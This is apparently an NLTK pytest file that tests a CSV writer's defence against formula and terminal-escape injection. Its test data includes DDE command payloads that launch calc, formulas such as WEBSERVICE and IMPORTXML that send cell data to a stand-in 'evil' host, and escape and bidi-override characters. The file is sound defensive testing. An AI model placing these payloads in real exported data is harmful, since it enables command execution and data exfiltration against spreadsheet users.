# Natural Language Toolkit: csvsec SafeCsvWriter and cell-pipeline tests
#
# Copyright (C) 2001-2026 NLTK Project
# URL: <https://www.nltk.org/>
# For license information, see LICENSE.TXT

"""``nltk.csvsec`` owns CSV/TSV cell safety through ONE pipeline, exposed as
:class:`SafeCsvWriter` (the drop-in ``csv.writer``) and
:func:`sanitize_csv_field` (one cell). These tests pin:

* the writer end to end: every cell of every row is defused, structural
  quoting still belongs to the csv module, dialects pass through, and an
  integer render bomb fails closed AT ``writerow``;
* the numeric-lead length cap: a formula-led digit run longer than any
  legitimate number is defused promptly without being parsed at all;
* the type sweep: bytes, numpy scalars, datetimes, paths, Decimal, Fraction,
  complex and lying subclasses all flow through the SAME pipeline with no
  per-type special case, which is the design's whole point.
"""

import csv
import io
import time

import pytest

from nltk.csvsec import (
    _MAX_NUMERIC_CELL_LEN,
    _looks_numeric,
    SafeCsvDictWriter,
    SafeCsvWriter,
    safe_csv_dict_writer,
    safe_csv_writer,
    sanitize_csv_field,
)

ESC = "\x1b"
RLO = chr(0x202E)


def _roundtrip(rows, **fmtparams):
    buf = io.StringIO()
    writer = safe_csv_writer(buf, **fmtparams)
    writer.writerows(rows)
    buf.seek(0)
    return list(csv.reader(buf, **fmtparams))


class TestSafeCsvWriterEndToEnd:
    def test_attack_row_fully_defused(self):
        class EvilObj:
            def __str__(self):
                return "=cmd|'/c calc'!A1"

        rows = _roundtrip(
            [["=SUM(A1)", ESC + "]0;pwn\x07", EvilObj(), "user" + RLO + "gnp"]]
        )
        (row,) = rows
        assert row[0] == "'=SUM(A1)"
        assert ESC not in row[1]
        assert row[2].startswith("'=")
        assert RLO not in row[3]

    def test_exact_primitives_written_natively(self):
        (row,) = _roundtrip([[42, -3.5, True, None, "plain"]])
        assert row == ["42", "-3.5", "True", "", "plain"]

    def test_embedded_newline_is_csv_quoted_roundtrip(self):
        (row,) = _roundtrip([["line1\nline2", "b"]])
        assert row == ["line1\nline2", "b"]

    def test_dialect_fmtparams_pass_through(self):
        (row,) = _roundtrip([["a", "=x"]], delimiter=";")
        assert row == ["a", "'=x"]

    def test_dialect_property_exposed(self):
        assert SafeCsvWriter(io.StringIO()).dialect.delimiter == ","

    def test_int_bomb_fails_closed_at_writerow(self):
        writer = safe_csv_writer(io.StringIO())
        with pytest.raises(ValueError):
            writer.writerow(["fine", 1 << 400_000])

    def test_writer_output_matches_per_cell_sanitisation(self):
        # the writer is exactly csv.writer over sanitize_csv_field, no more
        cells = ["=a", "-3.5", "café", ESC + "[2J"]
        buf_safe, buf_manual = io.StringIO(), io.StringIO()
        safe_csv_writer(buf_safe).writerow(cells)
        csv.writer(buf_manual).writerow([sanitize_csv_field(c) for c in cells])
        assert buf_safe.getvalue() == buf_manual.getvalue()

    def test_row_iterable_raising_midway_writes_nothing(self):
        # the row is materialised (and every cell sanitised) BEFORE the
        # underlying writerow, so a poisoned iterable cannot leave a partial
        # row in the stream
        def poison():
            yield "a"
            yield "=b"
            raise RuntimeError("mid-row")

        buf = io.StringIO()
        with pytest.raises(RuntimeError):
            SafeCsvWriter(buf).writerow(poison())
        assert buf.getvalue() == ""


class TestNumericLeadLengthCap:
    def test_million_digit_lead_defused_without_parsing(self):
        payload = "-" + "9" * 1_000_000
        # the cap is what makes the numeric test length-independent, so the
        # bound is on that function alone: microseconds against 0.1s, which no
        # machine speed can turn into a lottery (the full pipeline's linear
        # sanitiser scan over a million characters is a separate cost)
        start = time.perf_counter()
        assert _looks_numeric(payload) is False
        assert time.perf_counter() - start < 0.1
        assert sanitize_csv_field(payload).startswith("'-")

    def test_cap_boundary(self):
        at_cap = "-" + "9" * (_MAX_NUMERIC_CELL_LEN - 1)
        assert sanitize_csv_field(at_cap) == at_cap  # still a genuine number
        over_cap = "-" + "9" * _MAX_NUMERIC_CELL_LEN
        assert sanitize_csv_field(over_cap).startswith("'")

    def test_long_body_without_formula_lead_untouched(self):
        text = "9" * (_MAX_NUMERIC_CELL_LEN * 2)
        assert sanitize_csv_field(text) == text


class TestTypeSweepOnePipelineNoBranches:
    """Every type flows through the same materialise-then-sanitise pipeline;
    none of these required (or may ever require) a per-type special case."""

    def test_float_subclass_with_lying_str_defused(self):
        class EvilFloat(float):
            def __str__(self):
                return "=cmd()"

        out = sanitize_csv_field(EvilFloat(1.5))
        assert isinstance(out, str) and out.startswith("'=")

    def test_bytes_coerced_to_repr_text_matching_writer_parity(self):
        out = sanitize_csv_field(b"=cmd()\x1b")
        assert isinstance(out, str)
        assert out == str(b"=cmd()\x1b")  # repr text: lead is 'b', ESC escaped
        assert ESC not in out

    def test_bytearray_coerced(self):
        assert isinstance(sanitize_csv_field(bytearray(b"=x")), str)

    def test_numpy_scalars_flow_through(self):
        np = pytest.importorskip("numpy")
        assert sanitize_csv_field(np.int64(-5)) == "-5"
        out = sanitize_csv_field(np.float64(3.5))
        assert out == "3.5"
        assert sanitize_csv_field(np.str_("=x")).startswith("'=")

    def test_datetime_benign(self):
        import datetime

        out = sanitize_csv_field(datetime.datetime(2026, 9, 23, 12, 0, 0))
        assert out == "2026-09-23 12:00:00"

    def test_path_with_formula_name_defused(self):
        import pathlib

        assert sanitize_csv_field(pathlib.PurePosixPath("=cmd.txt")).startswith("'=")

    def test_decimal_negative_infinity_defused(self):
        from decimal import Decimal

        assert sanitize_csv_field(Decimal("-Infinity")).startswith("'")

    def test_fraction_and_complex_benign(self):
        from fractions import Fraction

        assert sanitize_csv_field(Fraction(1, 3)) == "1/3"
        assert sanitize_csv_field(complex(1, 2)) == "(1+2j)"

    def test_negative_fraction_lead_fails_closed(self):
        # "-1/2" begins with a lead char and is not a number, so the pipeline
        # defuses it: a cosmetic apostrophe, never a live minus-lead cell
        from fractions import Fraction

        assert sanitize_csv_field(Fraction(-1, 2)) == "'-1/2"
        assert sanitize_csv_field(complex(-1, 2)) == "(-1+2j)"


class TestResearchDrivenLeads:
    """Lead set from the cross-ecosystem evidence: % and | (the Ruby csv-safe
    sanitizer earned CVE-2022-28481 by missing them) and OWASP's fullwidth
    forms. The neutralisation is the apostrophe, never a TAB (Symfony's TAB
    prefix was itself CVE-2021-41270), and mid-cell text is never rewritten."""

    @pytest.mark.parametrize(
        "payload",
        [
            "%PROGRAMDATA%\\evil",
            "|calc",
            chr(0xFF1D) + "cmd()",
            chr(0xFF0B) + "1+cmd",
            chr(0xFF0D) + "1+cmd",
            chr(0xFF20) + "SUM(1)",
        ],
    )
    def test_extended_leads_defused(self, payload):
        out = sanitize_csv_field(payload)
        assert out.startswith("'"), out

    def test_gitlab_h1_payload_verbatim(self):
        # hackerone 216243: the classic DDE chain; the apostrophe defuses the
        # lead and the pipes stay untouched (no data mangling)
        out = sanitize_csv_field("=cmd|' /C calc'!A0")
        assert out == "'=cmd|' /C calc'!A0"

    @pytest.mark.parametrize(
        "fn",
        ["WEBSERVICE", "HYPERLINK", "IMPORTXML", "IMPORTDATA", "IMAGE", "DDE"],
    )
    def test_exfiltration_family_defused(self, fn):
        out = sanitize_csv_field("=" + fn + '("http://evil/",A1)')
        assert out.startswith("'=")

    def test_double_equals_stays_defused(self):
        # the strip-one-lead approach (django-import-export) turns ==SUM(A1)
        # into a live =SUM(A1); prefixing is immune to the class
        assert sanitize_csv_field("==SUM(A1)") == "'==SUM(A1)"

    @pytest.mark.parametrize("pad", ["\t", " \t ", "\u00a0", "\u3000"])
    def test_whitespace_padded_lead_defused(self, pad):
        # Excel strips a leading tab/space before evaluating; defusedcsv keeps
        # these forms, this pipeline defuses them via the whitespace-aware lead
        assert sanitize_csv_field(pad + "=x").startswith("'")

    def test_prefix_is_apostrophe_never_tab(self):
        out = sanitize_csv_field("=x")
        assert out[0] == "'" and "\t" not in out

    @pytest.mark.parametrize(
        "benign", ["100%", "50% off", "a|b", "x % y", "pipe|in|middle"]
    )
    def test_no_lead_means_untouched(self, benign):
        assert sanitize_csv_field(benign) == benign


class TestGroupedNumbers:
    """Accounting-style grouped negatives stay numbers (defusedcsv parity);
    anything beyond digits and , . grouping keeps the defusal."""

    @pytest.mark.parametrize(
        "num", ["-1,234", "-1,234.56", "+1,000", "-1.234,56", "-1,2,3"]
    )
    def test_grouped_negatives_kept(self, num):
        assert sanitize_csv_field(num) == num

    @pytest.mark.parametrize(
        "bad", ["-1,2(3)", "-1,234=SUM(A1)", "-,,", "+.,", chr(0xFF0D) + chr(0xFF13)]
    )
    def test_non_numbers_with_lead_still_defused(self, bad):
        assert sanitize_csv_field(bad).startswith("'")

    def test_grouped_number_over_cap_defused(self):
        big = "-" + "1," * (_MAX_NUMERIC_CELL_LEN)
        assert sanitize_csv_field(big).startswith("'")


class TestSafeCsvDictWriter:
    def test_values_and_header_defused_keys_intact(self):
        buf = io.StringIO()
        w = safe_csv_dict_writer(buf, ["name", "=evil"])
        w.writeheader()
        w.writerow({"name": "=SUM(A1)", "=evil": ESC + "[2J"})
        buf.seek(0)
        rows = list(csv.reader(buf))
        assert rows[0] == ["name", "'=evil"]  # header cell defused
        assert rows[1][0] == "'=SUM(A1)"
        assert ESC not in rows[1][1]

    def test_restval_is_defused(self):
        buf = io.StringIO()
        w = SafeCsvDictWriter(buf, ["a", "b"], restval="=missing")
        w.writerow({"a": "x"})
        buf.seek(0)
        (row,) = list(csv.reader(buf))
        assert row == ["x", "'=missing"]

    def test_extrasaction_ignore_passthrough(self):
        buf = io.StringIO()
        w = SafeCsvDictWriter(buf, ["a"], extrasaction="ignore")
        w.writerows([{"a": "=x", "junk": "=y"}])
        buf.seek(0)
        (row,) = list(csv.reader(buf))
        assert row == ["'=x"]

    def test_single_line_forwarding_and_dialect(self):
        buf = io.StringIO()
        w = safe_csv_dict_writer(buf, ["a"], single_line=True)
        w.writerow({"a": "x\ny"})
        assert w.dialect.delimiter == ","
        buf.seek(0)
        (row,) = list(csv.reader(buf))
        assert row == ["x\\x0ay"]


class TestSingleLineForwarding:
    """single_line reaches every sink as a strict, opt-in superset: embedded
    TAB/newline in a VALUE are escaped, defaults stay byte-identical."""

    def test_field_single_line_escapes_tab_and_newline(self):
        assert sanitize_csv_field("a\nb\tc", single_line=True) == "a\\x0ab\\x09c"
        assert sanitize_csv_field("a\nb\tc") == "a\nb\tc"  # default unchanged

    def test_newline_led_formula_both_modes_defused(self):
        # default: the spreadsheet skips leading whitespace, so the lead is
        # found and apostrophe-prefixed
        assert sanitize_csv_field("\n=x") == "'" + "\n=x"
        # single_line: the newline is escaped FIRST, so the cell begins with a
        # literal backslash, which no spreadsheet treats as a formula lead;
        # the escape itself is the defusal
        out = sanitize_csv_field("\n=x", single_line=True)
        assert out == "\\x0a=x"
        assert not out.lstrip().startswith(("=", "+", "@"))

    def test_writer_forwards_single_line(self):
        buf = io.StringIO()
        safe_csv_writer(buf, single_line=True).writerow(["x\ny", "=a", ESC + "[2J"])
        raw = buf.getvalue()
        # no real newline survives inside any cell; only the row terminator
        assert "\n" not in raw.replace("\r\n", "")
        (row,) = list(csv.reader(io.StringIO(raw)))
        assert row == ["x\\x0ay", "'=a", "\\x1b[2J"]

    def test_writer_single_line_hostile_mix(self):
        buf = io.StringIO()
        safe_csv_writer(buf, single_line=True).writerow(
            ["name" + ESC + "]0;p\x07\n2nd" + chr(0x202E)]
        )
        raw = buf.getvalue()
        assert ESC not in raw and chr(0x202E) not in raw
        assert "\n" not in raw.replace("\r\n", "")


class TestQuoteNoneStructuralGuard:
    """quoting=QUOTE_NONE removes the csv module's structural quoting, which
    the default pipeline relies on to contain embedded newlines. Verified
    empirically: with an escapechar, csv.writer writes the physical newline of
    a sanitized default-mode cell into the stream (backslash first, newline
    after), so the next physical line is a forged row whose first cell can be
    a live formula lead. Both writers refuse the combination fail-closed at
    construction unless single_line=True, where embedded newlines are escaped
    to visible text and cell data can never emit a physical newline."""

    def test_confirmed_bypass_chain_is_refused(self):
        # the confirmed chain: cell "x\n=SUM(A1)" + QUOTE_NONE + escapechar
        # produced 'x\\' newline '=SUM(A1)' before the guard existed
        with pytest.raises(ValueError, match="QUOTE_NONE"):
            safe_csv_writer(io.StringIO(), quoting=csv.QUOTE_NONE, escapechar="\\")

    def test_quote_none_refused_even_without_escapechar(self):
        # without escapechar csv.writer raises only on the FIRST hostile cell;
        # the guard refuses at construction, before any attacker data arrives
        with pytest.raises(ValueError, match="QUOTE_NONE"):
            safe_csv_writer(io.StringIO(), quoting=csv.QUOTE_NONE)

    def test_dict_writer_refuses_quote_none(self):
        with pytest.raises(ValueError, match="QUOTE_NONE"):
            safe_csv_dict_writer(
                io.StringIO(), ["a"], quoting=csv.QUOTE_NONE, escapechar="\\"
            )

    def test_dialect_object_cannot_smuggle_quote_none(self):
        # the guard checks the MERGED dialect, not the fmtparams alone
        class Unquoted(csv.excel):
            quoting = csv.QUOTE_NONE
            escapechar = "\\"

        with pytest.raises(ValueError, match="QUOTE_NONE"):
            safe_csv_writer(io.StringIO(), dialect=Unquoted)
        with pytest.raises(ValueError, match="QUOTE_NONE"):
            safe_csv_dict_writer(io.StringIO(), ["a"], dialect=Unquoted)

    def test_fmtparams_restoring_quoting_over_unquoted_dialect_allowed(self):
        # fmtparams override the dialect, so the EFFECTIVE quoting is safe here
        class Unquoted(csv.excel):
            quoting = csv.QUOTE_NONE
            escapechar = "\\"

        buf = io.StringIO()
        safe_csv_writer(buf, dialect=Unquoted, quoting=csv.QUOTE_MINIMAL).writerow(
            ["a\nb"]
        )
        assert buf.getvalue() == '"a\nb"\r\n'

    def test_single_line_legitimises_quote_none(self):
        buf = io.StringIO()
        writer = safe_csv_writer(
            buf, single_line=True, quoting=csv.QUOTE_NONE, escapechar="\\"
        )
        writer.writerow(["x\n=SUM(A1)", "=2+5"])
        raw = buf.getvalue()
        # exactly one physical line: no forged row can begin with a lead
        assert raw.endswith("\r\n")
        body = raw[:-2]
        assert "\n" not in body and "\r" not in body
        assert "\\x0a" in body  # the embedded newline survives as visible text
        assert "'=2+5" in raw  # ordinary leads stay apostrophe-defused

    def test_single_line_quote_none_dict_writer(self):
        buf = io.StringIO()
        writer = safe_csv_dict_writer(
            buf, ["a", "b"], single_line=True, quoting=csv.QUOTE_NONE, escapechar="\\"
        )
        writer.writeheader()
        writer.writerow({"a": "x\n=SUM(A1)", "b": "@cmd"})
        raw = buf.getvalue()
        assert raw.count("\n") == 2 and raw.count("\r\n") == 2
        assert "\\x0a" in raw and "'@cmd" in raw

    def test_other_quoting_modes_unaffected(self):
        for quoting in (csv.QUOTE_MINIMAL, csv.QUOTE_ALL, csv.QUOTE_NONNUMERIC):
            buf = io.StringIO()
            safe_csv_writer(buf, quoting=quoting).writerow(["=cmd", 12, 3.5])
            (row,) = list(csv.reader(io.StringIO(buf.getvalue())))
            assert row == ["'=cmd", "12", "3.5"]


class TestUnsafeDialectRefused:
    """The writer's own dialect characters are emitted at cell and line starts
    the cell pipeline never sees. Every chain below was confirmed against
    csv.writer before the guard existed: the escapechar precedes a
    cell-initial delimiter or quote, the quotechar wraps the cell, the
    delimiter follows an empty first cell, and the line terminator precedes
    the next line; a lead character in any of those positions is a formula
    for a consumer using the standard qualifier. quotechar=None is CPython's
    silent spelling of QUOTE_NONE when no dialect is named."""

    def test_escapechar_lead_under_single_line_quote_none(self):
        # the permitted QUOTE_NONE combination must not reopen the hole: a
        # cell beginning with the delimiter was written as '=,x'
        with pytest.raises(ValueError, match="escapechar"):
            safe_csv_writer(
                io.StringIO(),
                single_line=True,
                quoting=csv.QUOTE_NONE,
                escapechar="=",
            )

    def test_escapechar_lead_with_doublequote_off(self):
        # a quote-led cell was written as '="x' (escaped, not quoted)
        with pytest.raises(ValueError, match="escapechar"):
            safe_csv_writer(io.StringIO(), doublequote=False, escapechar="=")

    @pytest.mark.parametrize("quoting", [csv.QUOTE_ALL, csv.QUOTE_MINIMAL])
    def test_quotechar_lead_refused(self, quoting):
        # every quoted cell was written as '=x,y=' for a '"'-qualifier reader
        with pytest.raises(ValueError, match="quotechar"):
            safe_csv_writer(io.StringIO(), quoting=quoting, quotechar="=")

    @pytest.mark.parametrize("delimiter", ["=", "+", "-", "@", "%", "\uff1d"])
    def test_delimiter_lead_refused(self, delimiter):
        # an empty first cell put "=cmd|' /C calc'!A1" at the line start
        with pytest.raises(ValueError, match="delimiter"):
            safe_csv_writer(io.StringIO(), delimiter=delimiter)
        with pytest.raises(ValueError, match="delimiter"):
            safe_csv_dict_writer(io.StringIO(), ["a"], delimiter=delimiter)

    def test_pipe_delimiter_permitted_and_cells_still_defused(self):
        # pipe-delimited output is a standard format: the one documented
        # exception, with the cell pipeline untouched
        buf = io.StringIO()
        safe_csv_writer(buf, delimiter="|").writerow(["", "=SUM(A1)", "a|b"])
        buf.seek(0)
        (row,) = list(csv.reader(buf, delimiter="|"))
        assert row == ["", "'=SUM(A1)", "a|b"]

    def test_lineterminator_payload_refused(self):
        # "\n=" made every following line begin with a formula lead
        with pytest.raises(ValueError, match="lineterminator"):
            safe_csv_writer(io.StringIO(), lineterminator="\n=")
        with pytest.raises(ValueError, match="lineterminator"):
            safe_csv_dict_writer(io.StringIO(), ["a"], lineterminator="\r\n ")

    @pytest.mark.parametrize("terminator", ["\r\n", "\n", "\r"])
    def test_crlf_terminators_permitted(self, terminator):
        buf = io.StringIO()
        safe_csv_writer(buf, lineterminator=terminator).writerow(["=x"])
        assert buf.getvalue() == "'=x" + terminator

    def test_quotechar_none_refused_version_independently(self):
        # CPython 3.13 coerces the bare keyword form to QUOTE_NONE and
        # raises TypeError for the dialect forms; whichever the version does,
        # nothing constructs without single_line
        class NoQuote(csv.excel):
            quotechar = None

        with pytest.raises((ValueError, TypeError)):
            safe_csv_writer(io.StringIO(), dialect=NoQuote, escapechar="\\")
        with pytest.raises((ValueError, TypeError)):
            safe_csv_writer(io.StringIO(), quotechar=None, escapechar="\\")

    def test_dialect_class_cannot_smuggle_lead_characters(self):
        class Hostile(csv.excel):
            quotechar = "="

        with pytest.raises(ValueError, match="quotechar"):
            safe_csv_writer(io.StringIO(), dialect=Hostile)

        class HostileEsc(csv.excel):
            escapechar = "@"
            doublequote = False

        with pytest.raises(ValueError, match="escapechar"):
            safe_csv_dict_writer(io.StringIO(), ["a"], dialect=HostileEsc)

    @pytest.mark.parametrize(
        "fmtparams",
        [
            {"delimiter": "\t"},
            {"delimiter": ";"},
            {"delimiter": " "},
            {"quotechar": "'"},
            {"escapechar": "\\", "doublequote": False},
            {"quoting": csv.QUOTE_NONNUMERIC},
            {"dialect": "unix"},
            {"dialect": "excel-tab"},
        ],
    )
    def test_ordinary_dialects_unaffected(self, fmtparams):
        # benign configurations construct and still defuse a lead cell
        buf = io.StringIO()
        safe_csv_writer(buf, **fmtparams).writerow(["=x", "plain"])
        buf.seek(0)
        (row,) = list(csv.reader(buf, **fmtparams))
        assert row == ["'=x", "plain"]

    def test_apostrophe_quotechar_keeps_defusal_for_standard_reader(self):
        # our defusal prefix IS the quotechar here: the cell is quoted and
        # doubled, and a '"'-qualifier reader still sees text, not a formula
        buf = io.StringIO()
        safe_csv_writer(buf, quotechar="'").writerow(["=x"])
        raw = buf.getvalue()
        assert raw.startswith("'")
        (row,) = list(csv.reader(io.StringIO(raw)))
        assert not row[0].lstrip().startswith("=")


def test_termsec_reexport_is_the_same_function():
    import nltk.termsec as termsec

    assert termsec.sanitize_csv_field is sanitize_csv_field
